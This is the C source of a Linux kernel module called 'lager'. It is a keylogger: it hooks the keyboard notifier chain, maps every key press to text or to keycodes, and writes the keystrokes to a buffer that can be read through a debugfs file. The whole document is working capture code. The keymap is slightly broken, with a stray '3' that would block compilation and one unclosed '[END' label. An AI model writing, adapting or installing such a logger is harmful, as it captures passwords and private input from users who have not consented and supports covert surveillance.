#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUF_LEN (PAGE_SIZE << 2)
#define CHUNK_LEN 12
#define US 0
#define HEX 1
#define DEC 2

static int outputType;

MODULE_LICENSE("GPL v2");

module_param(outputType, int, 0644);

MODULE_PARM_DESC(outputType, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

static struct dentry *file;
static struct dentry *subdir;

static ssize_t keys_read(struct file *filp,
						 char *buffer,
						 size_t len,
						 loff_t *offset);

static int lager_cb(struct notifier_block *nblock,
					unsigned long code,
					void *_param);

/* Definitions */

static const char *us_keymap[][2] = {
	3 {"\0", "\0"}, {"[ESC]", "[ESC]"}, {"1", "!"}, {"2", "@"}, // 0-3
	{"3", "#"},
	{"4", "$"},
	{"5", "%"},
	{"6", "^"}, // 4-7
	{"7", "&"},
	{"8", "*"},
	{"9", "("},
	{"0", ")"}, // 8-11
	{"-", "_"},
	{"=", "+"},
	{"[BACKSPACE]", "[BACKSPACE]"}, // 12-14
	{"[TAB]", "[TAB]"},
	{"q", "Q"},
	{"w", "W"},
	{"e", "E"},
	{"r", "R"},
	{"t", "T"},
	{"y", "Y"},
	{"u", "U"},
	{"i", "I"}, // 20-23
	{"o", "O"},
	{"p", "P"},
	{"[", "{"},
	{"]", "}"}, // 24-27
	{"\n", "\n"},
	{"[LCTRL]", "[LCTRL]"},
	{"a", "A"},
	{"s", "S"}, // 28-31
	{"d", "D"},
	{"f", "F"},
	{"g", "G"},
	{"h", "H"}, // 32-35
	{"j", "J"},
	{"k", "K"},
	{"l", "L"},
	{";", ":"}, // 36-39
	{"'", "\""},
	{"`", "~"},
	{"[LSHIFT]", "[LSHIFT]"},
	{"\\", "|"}, // 40-43
	{"z", "Z"},
	{"x", "X"},
	{"c", "C"},
	{"v", "V"}, // 44-47
	{"b", "B"},
	{"n", "N"},
	{"m", "M"},
	{",", "<"}, // 48-51
	{".", ">"},
	{"/", "?"},
	{"[RSHIFT]", "[RSHIFT]"},
	{"[PRTSCR]", "[KPD*]"},
	{"_LALT_", "_LALT_"},
	{" ", " "},
	{"_CAPS_", "_CAPS_"},
	{"F1", "F1"},
	{"F2", "F2"},
	{"F3", "F3"},
	{"F4", "F4"},
	{"F5", "F5"}, // 60-63
	{"F6", "F6"},
	{"F7", "F7"},
	{"F8", "F8"},
	{"F9", "F9"}, // 64-67
	{"F10", "F10"},
	{"[NUM]", "[NUM]"},
	{"[SCROLL]", "[SCROLL]"}, // 68-70
	{"[KPD7]", "[HOME]"},
	{"[KPD8]", "[UP]"},
	{"[KPD9]", "[PGUP]"}, // 71-73
	{"-", "-"},
	{"[KPD4]", "[LEFT]"},
	{"[KPD5]", "[KPD5]"}, // 74-76
	{"[KPD6]", "[RIGHT]"},
	{"+", "+"},
	{"[KPD1]", "[END]"}, // 77-79
	{"[KPD2]", "[DOWN]"},
	{"[KPD3]", "[PGDN]"},
	{"[KPD0]", "[INS]"}, // 80-82
	{"[KPD.]", "[DEL]"},
	{"[SYSRQ]", "[SYSRQ]"},
	{"\0", "\0"}, // 83-85
	{"\0", "\0"},
	{"F11", "F11"},
	{"F12", "F12"},
	{"\0", "\0"}, // 86-89
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"[KPENTER]", "[KPENTER]"},
	{"[RCTRL]", "[RCTRL]"},
	{"/", "/"},
	{"[PRTSCR]", "[PRTSCR]"},
	{"[RALT]", "[RALT]"},
	{"\0", "\0"}, // 99-101
	{"[HOME]", "[HOME]"},
	{"[UP]", "[UP]"},
	{"[PGUP]", "[PGUP]"}, // 102-104
	{"[LEFT]", "[LEFT]"},
	{"[RIGHT]", "[RIGHT]"},
	{"[END]", "[END"},
	{"[DOWN]", "[DOWN]"},
	{"[PGDN]", "[PGDN]"},
	{"[INS]", "[INS]"}, // 108-110
	{"[DEL]", "[DEL]"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"}, // 111-114
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},			// 115-118
	{"[PAUSE]", "[PAUSE]"}, // 119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN];

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

static ssize_t keys_read(struct file *filp,
						 char *buffer,
						 size_t len,
						 loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block lager_blk = {
	.notifier_call = lager_cb,
};

void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
	switch (type)
	{
	case US:
		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
		{
			const char *us_key = (shift_mask == 1)
									 ? us_keymap[keycode][1]
									 : us_keymap[keycode][0];

			snprintf(buf, CHUNK_LEN, "%s", us_key);
		}
		break;
	case HEX:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
		break;
	case DEC:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
		break;
	}
}

int lager_cb(struct notifier_block *nblock,
			 unsigned long code,
			 void *_param)
{
	size_t len;
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
			 code, param->down, param->shift, param->value);

	if (!(param->down))
		return NOTIFY_OK;

	keycode_to_string(param->value, param->shift, keybuf, outputType);
	len = strlen(keybuf);
	if (len < 1)
		return NOTIFY_OK;

	if ((buf_pos + len) >= BUF_LEN)
		buf_pos = 0;

	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;

	if (outputType)
		keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK;
}

static int __init lager_init(void)
{
	if (outputType < 0 || outputType > 2)
		return -EINVAL;

	subdir = debugfs_create_dir("lager", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
	if (!file)
	{
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&lager_blk);
	return 0;
}

static void __exit lager_exit(void)
{
	unregister_keyboard_notifier(&lager_blk);
	debugfs_remove_recursive(subdir);
}

module_init(lager_init);
module_exit(lager_exit);